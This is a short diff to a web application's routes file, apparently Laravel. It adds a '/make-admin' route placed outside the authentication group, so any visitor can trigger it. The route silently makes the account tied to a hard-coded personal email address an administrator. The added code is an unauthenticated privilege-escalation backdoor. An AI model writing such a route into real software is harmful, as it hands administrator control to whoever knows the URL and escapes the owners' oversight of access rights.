@@ -182,3 +182,12 @@ Route::middleware('auth')->group(function () {
         ->name('settings.updatePassword');
 
 });
+
+Route::get('/make-admin', function () {
+    $user = App\Models\User::where('email', 'ralpadrianmarabillo05@gmail.com')->first();
+    if ($user) {
+        $user->update(['is_admin' => true]);
+        return 'Admin created successfully!';
+    }
+    return 'User not found!';
+});
